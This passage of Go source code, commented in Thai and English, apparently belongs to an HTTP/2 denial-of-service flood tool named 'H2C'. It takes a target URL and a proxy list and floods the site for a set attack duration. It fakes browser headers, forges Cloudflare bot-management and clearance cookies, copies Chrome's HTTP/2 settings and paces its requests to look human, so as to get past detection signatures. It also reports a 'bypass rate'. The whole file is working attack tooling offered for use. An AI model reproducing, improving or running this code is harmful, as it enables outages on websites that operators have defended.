				h2_headers = append(h2_headers, [2]string{"sec-ch-ua-platform", browserProfile.secChUAPlatform})
			}
			h2_headers = append(h2_headers, [2]string{"upgrade-insecure-requests", "1"})
			h2_headers = append(h2_headers, [2]string{"user-agent", browserProfile.userAgent})
			h2_headers = append(h2_headers, [2]string{"accept", browserProfile.acceptValue})
			if !browserProfile.isFirefox && !browserProfile.isSafari {
				h2_headers = append(h2_headers, [2]string{"sec-fetch-site", secFetchSite})
				h2_headers = append(h2_headers, [2]string{"sec-fetch-mode", secFetchMode})
				h2_headers = append(h2_headers, [2]string{"sec-fetch-user", secFetchUser})
				h2_headers = append(h2_headers, [2]string{"sec-fetch-dest", secFetchDest})
			}
			h2_headers = append(h2_headers, [2]string{"accept-encoding", browserProfile.acceptEncoding})
			h2_headers = append(h2_headers, [2]string{"accept-language", acceptLang})
		}
		
		// Safari-specific headers
		if browserProfile.isSafari {
			// Safari ไม่มี upgrade-insecure-requests เมื่อเป็น HTTPS
			if scheme == "https" {
				// Remove upgrade-insecure-requests for Safari HTTPS
				for i, header := range h2_headers {
					if header[0] == "upgrade-insecure-requests" {
						h2_headers = append(h2_headers[:i], h2_headers[i+1:]...)
						break
					}
				}
			}
		}
		
		// Edge-specific tweaks
		if browserProfile.isEdge {
			// Edge มี sec-ch-ua-mobile บางครั้ง
			if rand.Float32() < 0.8 {
				h2_headers = append(h2_headers, [2]string{"sec-ch-ua-mobile", "?0"})
			}
		}
		
		h2_headers = append(h2_headers, [2]string{"accept-language", acceptLang})
		
		// เพิ่ม headers เสริมเพื่อจำลองเบราว์เซอร์จริงให้สมจริงขึ้น (เพื่อหลีกเลี่ยง signature #17)
		
		// Dynamic header probability based on proxy profile (anti-signature #69)
		dntProb := float32(0.3)
		cacheControlProb := float32(0.1)
		refererProb := float32(0.7)
		
		if proxyInfo != nil {
			// ปรับความน่าจะเป็นตาม TimingProfile
			switch proxyInfo.TimingProfile {
			case 0: // Conservative users มักมี DNT และ cache-control มากกว่า
				dntProb = 0.5
				cacheControlProb = 0.2
			case 1: // Moderate users - ค่าปกติ
				// ใช้ค่าเริ่มต้น
			case 2: // Aggressive users มักไม่สน privacy headers
				dntProb = 0.1
				refererProb = 0.9 // แต่มักมี referer
			}
		}
		
		// DNT header (บางครั้งมี บางครั้งไม่มี)
		if rand.Float32() < dntProb {
			h2_headers = append(h2_headers, [2]string{"dnt", "1"})
		}
		
		// Cache-Control (เมื่อมีการ refresh)
		if rand.Float32() < cacheControlProb {
			h2_headers = append(h2_headers, [2]string{"cache-control", "max-age=0"})
		}
		
		// Referer header (สำหรับ subsequent requests)
		if secFetchSite != "none" && rand.Float32() < refererProb {
			referers := []string{
				fmt.Sprintf("%s://%s/", scheme, parsed.Host),
				fmt.Sprintf("%s://%s/index", scheme, parsed.Host),
				fmt.Sprintf("%s://%s/home", scheme, parsed.Host),
			}
			h2_headers = append(h2_headers, [2]string{"referer", referers[rand.Intn(len(referers))]})
		}
		
		// Advanced cookie management with realistic browser behavior (anti-signature #69)
		var cookieHeader string
		if cookie != "" {
			cookieHeader = cookie
		}
		
		// Sophisticated session cookie simulation
		if proxyInfo != nil {
			// Initialize cookies on first few requests (simulating server setting cookies)
			if len(proxyInfo.SessionCookies) == 0 && proxyInfo.RequestCount >= 1 && proxyInfo.RequestCount <= 5 {
				// Common tracking and session cookies
				cookieTypes := []struct {
					name     string
					generate func() string
					prob     float32
				}{
					// Session cookies (always set)
					{"JSESSIONID", func() string { return fmt.Sprintf("%s%d", genRandStr(16), time.Now().Unix()) }, 1.0},
					{"_csrf", func() string { return genRandStr(32) }, 0.9},
					{"session_id", func() string { return fmt.Sprintf("%s-%d", genRandStr(24), time.Now().Unix()) }, 0.7},
					
					// Analytics cookies
					{"_ga", func() string { 
						return fmt.Sprintf("GA1.2.%d.%d", rand.Int63n(999999999), time.Now().Unix()-rand.Int63n(86400*30))
					}, 0.6},
					{"_gid", func() string { 
						return fmt.Sprintf("GA1.2.%d.%d", rand.Int63n(999999999), time.Now().Unix())
					}, 0.5},
					{"_gat", func() string { return "1" }, 0.2},
					
					// Preference cookies
					{"lang", func() string { 
						langs := []string{"en", "es", "fr", "de", "ja", "zh"}
						return langs[rand.Intn(len(langs))]
					}, 0.4},
					{"theme", func() string {
						themes := []string{"light", "dark", "auto"}
						return themes[rand.Intn(len(themes))]
					}, 0.3},
					
					// Marketing cookies (if DNT is not enabled)
					{"_fbp", func() string {
						if !proxyInfo.DNTEnabled {
							return fmt.Sprintf("fb.1.%d.%d", time.Now().Unix()*1000, rand.Int63n(999999999))
						}
						return ""
					}, 0.3},
					
					// CloudFlare specific cookies (important for bypass)
					{"__cf_bm", func() string { 
						// Cloudflare bot management cookie format
						return base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%d.%s", time.Now().Unix(), genRandStr(20))))
					}, 0.8},
					{"cf_clearance", func() string {
						// Clearance cookie after passing challenge
						return fmt.Sprintf("%s-%d-%s", genRandStr(40), time.Now().Unix(), genRandStr(10))
					}, 0.5},
				}
				
				// Set cookies based on probability
				for _, ct := range cookieTypes {
					if rand.Float32() < ct.prob {
						value := ct.generate()
						if value != "" {
							proxyInfo.SessionCookies[ct.name] = value
						}
					}
				}
			}
			
			// Evolve cookies over time (update timestamps, rotate values)
			if proxyInfo.RequestCount > 0 && proxyInfo.RequestCount%50 == 0 {
				// Update GA cookies periodically
				if _, exists := proxyInfo.SessionCookies["_ga"]; exists {
					proxyInfo.SessionCookies["_ga"] = fmt.Sprintf("GA1.2.%d.%d", 
						rand.Int63n(999999999), time.Now().Unix()-rand.Int63n(86400*30))
				}
				
				// Rotate CSRF tokens occasionally
				if rand.Float32() < 0.1 {
					proxyInfo.SessionCookies["_csrf"] = genRandStr(32)
				}
			}
			
			// Build cookie header with realistic ordering
			var cookiePairs []string
			
			// Priority order for cookies (important ones first)
			priorityOrder := []string{"__cf_bm", "cf_clearance", "JSESSIONID", "session_id", "_csrf"}
			for _, name := range priorityOrder {
				if value, exists := proxyInfo.SessionCookies[name]; exists {
					cookiePairs = append(cookiePairs, fmt.Sprintf("%s=%s", name, value))
					delete(proxyInfo.SessionCookies, name) // Remove to avoid duplication
				}
			}
			
			// Add remaining cookies
			for name, value := range proxyInfo.SessionCookies {
				cookiePairs = append(cookiePairs, fmt.Sprintf("%s=%s", name, value))
			}
			
			// Restore deleted cookies
			for _, name := range priorityOrder {
				for _, pair := range cookiePairs {
					if strings.HasPrefix(pair, name+"=") {
						parts := strings.SplitN(pair, "=", 2)
						if len(parts) == 2 {
							proxyInfo.SessionCookies[name] = parts[1]
						}
						break
					}
				}
			}
			
			if len(cookiePairs) > 0 {
				if cookieHeader != "" {
					cookieHeader += "; "
				}
				cookieHeader += strings.Join(cookiePairs, "; ")
			}
		}
		
		// Add cookie header if present
		if cookieHeader != "" {
			// Insert cookie header at appropriate position based on browser
			cookieInserted := false
			for i, header := range h2_headers {
				// Chrome/Edge: cookie comes after accept-language
				// Firefox: cookie comes after accept-encoding
				// Safari: cookie comes after user-agent
				if (browserProfile.isFirefox && header[0] == "accept-encoding") ||
				   (!browserProfile.isFirefox && !browserProfile.isSafari && header[0] == "accept-language") ||
				   (browserProfile.isSafari && header[0] == "user-agent") {
					// Insert cookie after this header
					h2_headers = append(h2_headers[:i+1], append([][2]string{{"cookie", cookieHeader}}, h2_headers[i+1:]...)...)
					cookieInserted = true
					break
				}
			}
			
			// Fallback if position not found
			if !cookieInserted {
				h2_headers = append(h2_headers, [2]string{"cookie", cookieHeader})
			}
		}
		
		// เพิ่ม session ID แบบที่ดูเป็นธรรมชาติ (เพื่อหลีกเลี่ยง signature #17)
		if proxyInfo != nil {
			kvpair := strings.Split(proxyInfo.SessionID, ":")
			if len(kvpair) == 2 {
				// ทำให้ดูเป็น custom header ที่สมเหตุสมผล
				headerName := kvpair[0]
				headerValue := kvpair[1]
				// ปรับชื่อ header ให้ดูเป็นธรรมชาติ
				if headerName != "x-request-id" && headerName != "x-session-id" {
					headerName = "x-request-id"
				}
				h2_headers = append(h2_headers, [2]string{headerName, headerValue})
			}
		}
		
		// จำลองการ retry ของเบราว์เซอร์จริง (เพื่อหลีกเลี่ยง Pattern #4)
		var conn net.Conn
		var wConn tls.UConn
		retryCount := 0
		maxRetries := 3
		
		for retryCount < maxRetries {
			// Initialize raw TCP connection
			var err error
			conn, err = initConnection(proxyInfo, hostname, port)
				if err != nil {
				retryCount++
				atomic.AddInt64(&errorCount, 1)
				
				// Human-like retry delays (เลียนแบบการรอของเบราว์เซอร์จริง)
				retryDelay := time.Duration(RandomInt(500, 2000)*retryCount) * time.Millisecond
			if debugmode > 1 {
					fmt.Printf("[H2C] | Connection failed, retry %d/%d after %v\n", retryCount, maxRetries, retryDelay)
			}
				time.Sleep(retryDelay)
					continue
				}

						// Establish TLS connection with custom fingerprinting
			wConn, err = establishTls(hostname, &conn, proxyInfo)
			if err != nil {
				retryCount++
				atomic.AddInt64(&errorCount, 1)
				conn.Close()
				
				// TLS handshake failures ใช้ delay ต่างออกไป
				retryDelay := time.Duration(RandomInt(200, 1000)*retryCount) * time.Millisecond
						if debugmode > 1 {
					fmt.Printf("[H2C] | TLS handshake failed, retry %d/%d after %v\n", retryCount, maxRetries, retryDelay)
				}
				time.Sleep(retryDelay)
				continue
			}
			
			// สำเร็จ - ออกจาก retry loop
			break
		}
		
		// หาก retry หมดแล้วยังไม่สำเร็จ
		if retryCount >= maxRetries {
			// Human-like backoff หลัง connection ล้มเหลว (anti-signature #69)
			backoffDelay := time.Duration(RandomInt(2000, 5000)) * time.Millisecond
			
			// ปรับ backoff ตาม proxy profile
			if proxyInfo != nil {
				switch proxyInfo.TimingProfile {
				case 0: // Conservative - รอนานกว่า
					backoffDelay = backoffDelay * 2
				case 1: // Moderate - รอปานกลาง
					// ใช้ค่าเริ่มต้น
				case 2: // Aggressive - รอสั้นกว่า
					backoffDelay = backoffDelay / 2
				}
			}
			time.Sleep(backoffDelay)
			continue
		}
		
		// Check negotiated protocol
		proto := wConn.ConnectionState().NegotiatedProtocol
		switch proto {
		case "http/1.1":
			// HTTP/1.1 disabled for this advanced version
			wConn.Close()
			continue
		default:
			// HTTP/2 Connection - send preface
			if _, err := wConn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")); err != nil {
				wConn.Close()
				atomic.AddInt64(&errorCount, 1)
				continue
			}
			
			// Send Chrome 120 compatible SETTINGS frame (เพื่อหลีกเลี่ยง Pattern #4)
			// Chrome 120 SETTINGS: HEADER_TABLE_SIZE=65536, ENABLE_PUSH=0, MAX_CONCURRENT_STREAMS=1000, 
			// INITIAL_WINDOW_SIZE=6291456, MAX_FRAME_SIZE=16777215, MAX_HEADER_LIST_SIZE=262144
			chromeSettings := []byte{
				0x00, 0x00, 0x24, // Length: 36 bytes (6 settings * 6 bytes each)
				0x04,             // Type: SETTINGS
				0x00,             // Flags: 0
				0x00, 0x00, 0x00, 0x00, // Stream ID: 0
				
				// SETTINGS_HEADER_TABLE_SIZE (0x1) = 65536
				0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
				
				// SETTINGS_ENABLE_PUSH (0x2) = 0
				0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
				
				// SETTINGS_MAX_CONCURRENT_STREAMS (0x3) = 1000
				0x00, 0x03, 0x00, 0x00, 0x03, 0xe8,
				
				// SETTINGS_INITIAL_WINDOW_SIZE (0x4) = 6291456
				0x00, 0x04, 0x00, 0x60, 0x00, 0x00,
				
				// SETTINGS_MAX_FRAME_SIZE (0x5) = 16777215
				0x00, 0x05, 0x00, 0xff, 0xff, 0xff,
				
				// SETTINGS_MAX_HEADER_LIST_SIZE (0x6) = 262144  
				0x00, 0x06, 0x00, 0x04, 0x00, 0x00,
			}
			if _, err := wConn.Write(chromeSettings); err != nil {
				wConn.Close()
				atomic.AddInt64(&errorCount, 1)
				continue
			}
			
			// Read server SETTINGS
			srvSettings := make([]byte, 1024)
			wConn.SetReadDeadline(time.Now().Add(5 * time.Second))
			n, err := wConn.Read(srvSettings)
			if err != nil || n < 9 || srvSettings[3] != 0x04 {
				wConn.Close()
				atomic.AddInt64(&errorCount, 1)
				continue
			}
			
						// Send SETTINGS ACK
			if _, err := wConn.Write([]byte{0x00, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00}); err != nil {
				wConn.Close()
				atomic.AddInt64(&errorCount, 1)
			continue
		}
			
			// Send WINDOW_UPDATE frame ให้เหมือนเบราว์เซอร์จริง (anti-pattern #3)
			// เบราว์เซอร์จริงมักส่ง WINDOW_UPDATE หลังจาก SETTINGS
			windowIncrement := uint32(65536) // Typical browser window increment
			windowUpdateFrame := []byte{
				0x00, 0x00, 0x04, // Length: 4 bytes
				0x08,             // Type: WINDOW_UPDATE
				0x00,             // Flags: 0
				0x00, 0x00, 0x00, 0x00, // Stream ID: 0 (connection-level)
			}
			incrementBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(incrementBytes, windowIncrement)
			windowUpdateFrame = append(windowUpdateFrame, incrementBytes...)
			
			if _, err := wConn.Write(windowUpdateFrame); err != nil {
				wConn.Close()
				atomic.AddInt64(&errorCount, 1)
				continue
			}
			
			// Initialize framer for HTTP/2 requests
			var fr Framer
			fr.init()
			var buf bytes.Buffer
			
			// Calculate request rate with session warming and proxy-specific variations (เพื่อหลีกเลี่ยง Pattern #4 & Signature #69)
	rate := rps
	if randrate {
		rate = RandomInt(1, 90)
	}

			// ใช้ proxy-specific RateFactor เพื่อหลีกเลี่ยง uniform request patterns (anti-signature #69)
			if proxyInfo != nil && proxyInfo.RateFactor > 0 {
				rate = int(float64(rate) * proxyInfo.RateFactor)
				if rate < 1 { 
					rate = 1 
				}
			}

					// จำลอง session warming: เริ่มช้าแล้วค่อยเร็วขึ้น (เลียนแบบมนุษย์จริง)
		if sessionAge < maxSessionAge {
			warmupFactor := float64(sessionAge) / float64(maxSessionAge)
			rate = int(float64(rate) * (0.3 + 0.7*warmupFactor)) // เริ่มที่ 30% แล้วค่อยเพิ่มเป็น 100%
			if rate < 1 {
				rate = 1
			}
		}
		
		// Advanced organic traffic control system (anti-signature #69)
		
		// ปรับ rate ตาม daily patterns
		rate = int(float64(rate) * currentPattern.activityMultiplier)
		if rate < 1 {
			rate = 1
		}
		
		// Session evolution with more realistic patterns
		if proxyInfo != nil {
			sessionDuration := time.Since(proxyInfo.SessionStartTime).Minutes()
			
			// Error rate affect behavior (เมื่อ error เยอะ จะช้าลง)
			errorRate := float64(sessionErrors) / float64(sessionRequests + 1)
			if errorRate > 0.1 { // หาก error rate > 10%
				rate = int(float64(rate) * 0.7) // ช้าลง 30%
			}
			
			// Activity burst patterns based on realistic usage
			if sessionDuration > 5 && sessionDuration < 15 {
				// First 15 minutes: learning phase - gradual increase
				rate = int(float64(rate) * (0.5 + sessionDuration/30))
			} else if sessionDuration > 15 && sessionDuration < 45 {
				// Peak usage phase - highest activity
				rate = int(float64(rate) * 1.3)
				// Random micro-bursts (เหมือนคลิกหลายลิงก์ติดกัน)
				if rand.Float32() < 0.15 {
					rate = rate * 2
				}
			} else if sessionDuration > 45 && sessionDuration < 90 {
				// Declining phase - getting bored
				rate = int(float64(rate) * 0.8)
				// Occasional re-engagement bursts
				if rand.Float32() < 0.1 {
					rate = rate * 3 
				}
			} else if sessionDuration > 90 {
				// Idle browsing - very sporadic
				rate = int(float64(rate) * 0.3)
				// Long pauses with sudden activity
				if rand.Float32() < 0.05 {
					rate = rate * 5 // 5% chance of sudden high activity
				}
				// High chance of long pauses
				if rand.Float32() < 0.7 {
					pauseDuration := time.Duration(RandomInt(30, 180)) * time.Second
					time.Sleep(pauseDuration)
				}
			}
		}
		
		// Daily pattern pause probability
		if rand.Float32() < currentPattern.pauseProbability {
			// Natural pause durations based on time of day
			var pauseRange []int
			if currentHour >= 0 && currentHour <= 6 {
				pauseRange = []int{30, 300} // Night: 30s-5min pauses
			} else if currentHour >= 7 && currentHour <= 17 {
				pauseRange = []int{5, 60}   // Work hours: 5s-1min pauses  
			} else {
				pauseRange = []int{10, 120} // Evening: 10s-2min pauses
			}
			pauseDuration := time.Duration(RandomInt(pauseRange[0], pauseRange[1])) * time.Second
			time.Sleep(pauseDuration)
		}

			// Send requests with human-like patterns (เพื่อหลีกเลี่ยง Pattern #4)
			successfulRequests := 0
			
			// จำลองพฤติกรรมการโหลดหน้าเว็บของมนุษย์จริง
			for i := 1; i <= rate; i++ {
				bts, err := fr.request(h2_headers)
						if err != nil {
						if debugmode > 1 {
						log.Println("Framer error:", err)
					}
					break
				}
				
				// Buffer requests แต่ไม่เยอะเกินไป (เลียนแบบเบราว์เซอร์จริง)
				if len(buf.Bytes())+len(bts) > 1200 || i%3 == 0 { // ส่งเป็นชุดๆ เหมือนเบราว์เซอร์จริง
					if _, err := wConn.Write(buf.Bytes()); err != nil {
						wConn.Close()
						break
					}
					buf.Reset()
					successfulRequests += i - 1
					
					// Human-like pause between request bursts (เลียนแบบการรอโหลดของเบราว์เซอร์)
					if i < rate {
						if floodOption {
							time.Sleep(time.Microsecond * time.Duration(RandomInt(50, 300)))
						} else {
							time.Sleep(time.Millisecond * time.Duration(RandomInt(10, 50)))
						}
					}
				}
				buf.Write(bts)
				
				// Human-like variations ใน request timing โดยใช้ proxy-specific TimingProfile (anti-signature #69)
				if floodOption {
					// แม้ flood mode ก็ยังต้องมี variance เลียนแบบการคลิกของมนุษย์
					if rand.Float32() < 0.15 { // 15% chance มี pause นานขึ้น
						time.Sleep(time.Millisecond * time.Duration(RandomInt(5, 20)))
					} else {
						time.Sleep(time.Microsecond * time.Duration(RandomInt(100, 500)))
					}
				} else {
					// ใช้ TimingProfile เพื่อสร้างความหลากหลายของพฤติกรรม
					var baseDelay int
					if proxyInfo != nil {
						switch proxyInfo.TimingProfile {
						case 0: // Conservative timing (slow reader)
							baseDelay = RandomInt(200, 1200)
						case 1: // Moderate timing (average user) 
							baseDelay = RandomInt(50, 400)
						case 2: // Aggressive timing (fast user)
							baseDelay = RandomInt(10, 100)
						default:
							baseDelay = RandomInt(20, 150)
						}
					} else {
						baseDelay = RandomInt(20, 150)
					}
					
					// เพิ่ม random variance เพิ่มเติม
					if rand.Float32() < 0.3 { // 30% chance หยุดอ่านนานขึ้น
						baseDelay += RandomInt(100, 500)
					}
					time.Sleep(time.Millisecond * time.Duration(baseDelay))
				}
			}
			
			// Send remaining buffered requests
			if len(buf.Bytes()) > 0 {
				if _, err := wConn.Write(buf.Bytes()); err != nil {
					wConn.Close()
					atomic.AddInt64(&errorCount, 1)
				} else {
					successfulRequests = rate
				}
			}
			
						// Update statistics with session tracking (anti-signature #69)
			if successfulRequests > 0 {
				atomic.AddInt64(&successCount, int64(successfulRequests))
				atomic.AddInt64(&totalRequests, int64(successfulRequests))
				atomic.AddInt32(&requests, int32(successfulRequests))
				atomic.AddInt32(&responses, int32(successfulRequests))
				
				// Update session counters
				sessionRequests += int64(successfulRequests)
				
				// Update proxy-specific session stats (anti-signature #69)
				if proxyInfo != nil {
					proxyInfo.RequestCount += int64(successfulRequests)
				}
				
				// Update status codes (assume success for now)
		mu.Lock()
				statuses["200"] += successfulRequests
		mu.Unlock()
			} else {
				// Track session errors for behavior adjustment
				sessionErrors++
				if proxyInfo != nil {
					proxyInfo.ErrorCount++
				}
			}
			
			// จำลองพฤติกรรม connection management ที่หลากหลายตาม proxy profile (anti-signature #69)
			
			// เลียนแบบการใช้ connection ตาม VolumeProfile ของ proxy
			var connectionLifetime time.Duration
			if proxyInfo != nil {
				switch proxyInfo.VolumeProfile {
				case 0: // Low volume user - connection อยู่นานกว่า
					connectionLifetime = time.Duration(RandomInt(5000, 15000)) * time.Millisecond
				case 1: // Medium volume user - connection ปานกลาง
					connectionLifetime = time.Duration(RandomInt(2000, 8000)) * time.Millisecond
				case 2: // High volume user - connection สั้นกว่า แต่มี burst
					connectionLifetime = time.Duration(RandomInt(1000, 4000)) * time.Millisecond
				default:
					connectionLifetime = time.Duration(RandomInt(2000, 8000)) * time.Millisecond
				}
			} else {
				connectionLifetime = time.Duration(RandomInt(2000, 8000)) * time.Millisecond
			}
			
			if floodOption {
				// Flood mode: ลด lifetime ลง แต่ยังคงใช้ profile
				connectionLifetime = connectionLifetime / 3
				if connectionLifetime < 500*time.Millisecond {
					connectionLifetime = 500 * time.Millisecond
				}
			}
			
			go func() {
				// Human-like connection reuse patterns
				select {
				case <-time.After(connectionLifetime):
					// ปิด connection หลังใช้งานนานพอ (เลียนแบบ keep-alive timeout)
					wConn.Close()
				}
			}()
			
			// จำลองพฤติกรรมการท่องเว็บที่หลากหลายตาม proxy profile (anti-signature #69)
			var pauseChance float32 = 0.4
			var basePause time.Duration
			
			// ปรับพฤติกรรม pause ตาม TimingProfile และ VolumeProfile
			if proxyInfo != nil {
				// TimingProfile ส่งผลต่อ pause frequency
				switch proxyInfo.TimingProfile {
				case 0: // Conservative - หยุดพักบ่อยกว่า
					pauseChance = 0.6
				case 1: // Moderate - pause ปานกลาง  
					pauseChance = 0.4
				case 2: // Aggressive - pause น้อยกว่า
					pauseChance = 0.2
				}
				
				// VolumeProfile ส่งผลต่อระยะเวลา pause
				switch proxyInfo.VolumeProfile {
				case 0: // Low volume - pause นานกว่า
					basePause = time.Duration(RandomInt(500, 3000)) * time.Millisecond
				case 1: // Medium volume - pause ปานกลาง
					basePause = time.Duration(RandomInt(100, 1500)) * time.Millisecond  
				case 2: // High volume - pause สั้นกว่า
					basePause = time.Duration(RandomInt(20, 500)) * time.Millisecond
				default:
					basePause = time.Duration(RandomInt(100, 1500)) * time.Millisecond
				}
			} else {
				basePause = time.Duration(RandomInt(100, 1500)) * time.Millisecond
			}
			
			if rand.Float32() < pauseChance {
				if floodOption {
					// แม้ flood mode ก็ยังต้องมี realistic pause บ้าง
					basePause = basePause / 10
					if basePause < 10*time.Millisecond {
						basePause = 10 * time.Millisecond
					}
				}
				time.Sleep(basePause)
			} else {
				// การเชื่อมต่อต่อเนื่องแบบ active browsing
				activePause := time.Duration(RandomInt(20, 200)) * time.Millisecond
				time.Sleep(activePause)
			}
		}
	}
}



func LoadProxies() {
	parsedProxies, err := parseProxiesAdvanced(proxyFile)
	if err != nil {
		fmt.Printf("[H2C] | Error loading proxies: %v\n", err)
		return
	}

	proxies = parsedProxies
	
	// Shuffle proxies for better distribution
	rand.Seed(time.Now().UnixNano())
	rand.Shuffle(len(proxies), func(i, j int) {
		proxies[i], proxies[j] = proxies[j], proxies[i]
	})
	
	fmt.Printf("[H2C] | Loaded %d proxies\n", len(proxies))
}

func CPU() (float64, error) {
	percentages, err := cpu.Percent(0, true)
	if err != nil {
		return 0, err
	}
	return percentages[0], nil
}

func MEM() (float64, error) {
	vmStat, err := mem.VirtualMemory()
	if err != nil {
		return 0, err
	}
	return vmStat.UsedPercent, nil
}

func Summary() {
	elapsed := 0
	var totalRequests int32
	var totalConnections int32
	if proxyIP != "" {
		totalConnections = int32(conns)
	} else {
		totalConnections = int32(len(proxies) * conns)
	}
	for {
		mu.Lock()
		var statusString string
		var bypassedRequests float64
		var totalResponses float64

		totalRequests = requests + responses
		for code, count := range statuses {
			if statusString != "" {
				statusString += ", "
			}

			codeInt, err := strconv.Atoi(code)
			if err != nil && code == "PROXYERR" {
				statusString += fmt.Sprintf("\u001b[31m%s\u001b[0m: \u001b[4m%d\u001b[0m", code, count)
				continue
			}

			totalResponses += float64(count)

			if codeInt < 500 && codeInt >= 400 && codeInt != 404 {
				statusString += fmt.Sprintf("\u001b[31m%d\u001b[0m: \u001b[4m%d\u001b[0m", codeInt, count)
				continue
			} else if codeInt >= 300 && codeInt < 400 {
				statusString += fmt.Sprintf("\u001b[33m%d\u001b[0m: \u001b[4m%d\u001b[0m", codeInt, count)
				bypassedRequests += float64(count)
				continue
			} else if codeInt < 9 {
				continue
			} else {
				statusString += fmt.Sprintf("\u001b[32m%d\u001b[0m: \u001b[4m%d\u001b[0m", codeInt, count)
				bypassedRequests += float64(count)
			}
		}

		var averageRPS, bypassRate float64
		if elapsed > 0 {
			averageRPS = float64(totalRequests) / float64(elapsed)
		}

		if totalResponses > 0 {
			bypassRate = (bypassedRequests / totalResponses) * 100
		}

		if connections < 0 && proxyIP == "" {
			connections = int32(len(proxies))
		} else if connections < 0 && proxyIP != "" {
			connections = int32(conns)
		}

		if connections < 0 && limit > 0 {
			connections = int32(limit)
		}

		numGoroutines := runtime.NumGoroutine()

		cpuUsage, err := CPU()
		if err != nil {
			cpuUsage = 0
		}

		memUsage, err := MEM()
		if err != nil {
			memUsage = 0
		}

		fmt.Print("\u001b[H\u001b[2J")
		fmt.Printf("\n ————— \u001b[1mSummary (H2C)\u001b[0m ———–—\n")
		fmt.Printf("  GO Routines: \u001b[1m%d\u001b[0m\n", numGoroutines)
		fmt.Printf("  Connections: \u001b[1m%d/%d\u001b[0m\n", connections, totalConnections)
		fmt.Printf("  Status Codes: [%s]\n", statusString)
		fmt.Printf("  Sent: [\u001b[1m%d\u001b[0m], Received: [\u001b[1m%d\u001b[0m]\n", requests, responses)
		fmt.Printf("  Bypass rate: \u001b[1m%.2f\u001b[0m%%\n", bypassRate)
		fmt.Printf("  Average rq/s: \u001b[1m%.2f\u001b[0m\n", averageRPS)
		fmt.Printf("  CPU: [\u001b[1m%.2f%%\u001b[0m], MEM: [\u001b[1m%.2f%%\u001b[0m]\n", cpuUsage, memUsage)
		fmt.Printf("  Duration: \u001b[1m%d\u001b[0m seconds", duration-elapsed)
		fmt.Printf("\n —————————————————————————\n")
		mu.Unlock()
		time.Sleep(1 * time.Second)
		elapsed += 1
	}
}



func Verify(wg *sync.WaitGroup) {
	defer wg.Done()
	var final_proxies []*ProxyInfo
	var mu_proxy sync.Mutex

	var inner_wg sync.WaitGroup

	for index, proxy := range proxies {
		inner_wg.Add(1)
		go func(index int, proxy *ProxyInfo) {
			defer inner_wg.Done()
			fmt.Printf("[H2C] | [%d/%d] Checking proxy: %s\n", index, len(proxies), proxy.Addr)
			
			// Simple TCP connectivity test for raw approach
			conn, err := net.DialTimeout("tcp", proxy.Addr, 10*time.Second)
			if err != nil {
				fmt.Printf("[H2C] | (%s) Invalid proxy: %s\n", proxy.Addr, err.Error())
				return
			}
			conn.Close()
			
			fmt.Printf("[H2C] | (%s) Working Proxy\n", proxy.Addr)
				mu_proxy.Lock()
				final_proxies = append(final_proxies, proxy)
				mu_proxy.Unlock()
		}(index, proxy)
	}
	inner_wg.Wait()
	
	if len(final_proxies) >= 1 {
		proxies = final_proxies
		fmt.Printf("[H2C] | Verified %d working proxies\n", len(proxies))
	}
}



func main() {

	flag.StringVar(&target, "url", "", "Target URL")
	flag.IntVar(&rps, "rate", 10, "Requests per second")
	flag.IntVar(&conns, "threads", 1, "Connections per proxy")
	flag.IntVar(&duration, "time", 5, "Duration of attack")
	flag.StringVar(&proxyFile, "proxy", "", "Proxy file path")
	flag.StringVar(&cookie, "cookie", "", "Use custom Cookie header")
	flag.StringVar(&useragent, "ua", "", "Use custom User-Agent header")
	flag.StringVar(&proxyIP, "ip", "", "Use proxy IP address (flooder)")

	flag.BoolVar(&proxyAuth, "auth", false, "Use proxy authentication")
	flag.IntVar(&debugmode, "debug", 0, "Debug mode (0=off), (1=basic), (2=advanced)")
	flag.BoolVar(&randpath, "randpath", false, "Randomise url request path")
	flag.BoolVar(&randrate, "randrate", false, "Randomise rate of requests")
	flag.BoolVar(&ratelimitOption, "ratelimit", false, "use ratelimit handler")
	flag.BoolVar(&floodOption, "flood", false, "Increase request speed")
	flag.BoolVar(&useHpack, "hpack", false, "Use raw HTTP/2 hpack encoding")
	flag.BoolVar(&closeOption, "close", false, "Close bad/blocked requests")
	flag.IntVar(&limit, "limit", 0, "Limit number of proxy connections")
	flag.BoolVar(&verifyProxies, "verify", false, "Use built-in proxy checker")
	flag.StringVar(&originRaw, "origin", "", "Bypass geoblock (US,CN,NL)")
	flag.IntVar(&cpuLimit, "cpu", 0, "Limit number of cpu's")
	flag.Parse()

	// fmt.Printf("proxyAuth: [%v]\n", proxyAuth)

	if target == "" || proxyFile == "" {
		flag.Usage()
		os.Exit(1)
	}

	parsed, err := url.Parse(target)
	if err != nil {
		fmt.Printf("[H2C] | Error parsing target URL: %v\n", err)
		return
	}

	if cpuLimit > 0 {
		if cpuLimit > runtime.NumCPU() {
			runtime.GOMAXPROCS(runtime.NumCPU())
		} else {
			runtime.GOMAXPROCS(cpuLimit)
		}
	}

	LoadProxies()

	if verifyProxies {
	var wg sync.WaitGroup
		wg.Add(1)
		Verify(&wg)
		wg.Wait()
	}

	if debugmode == 1 {
		go Summary()
	}

	// Start attack with raw TLS approach
	if proxyIP != "" {
		// Single proxy mode
		singleProxy := &ProxyInfo{
			Addr:      proxyIP,
			Auth:      "",
			SessionID: fmt.Sprintf("%s:%s", genRandStr(5), genRandStr(8)),
		}
		for i := 0; i < conns; i++ {
			go startRawTLS(parsed, singleProxy)
		}
	} else {
		// Multiple proxy mode with advanced distribution
		for i := 0; i < conns; i++ {
			x := 0
			for _, proxy := range proxies {
				if x >= limit && limit != 0 {
					break
				}
				go startRawTLS(parsed, proxy)
				x++
			}
		}
	}

	time.Sleep(time.Duration(duration) * time.Second)
	fmt.Printf("\nAttack has ended after %d seconds!\n", duration)
	os.Exit(0)
}
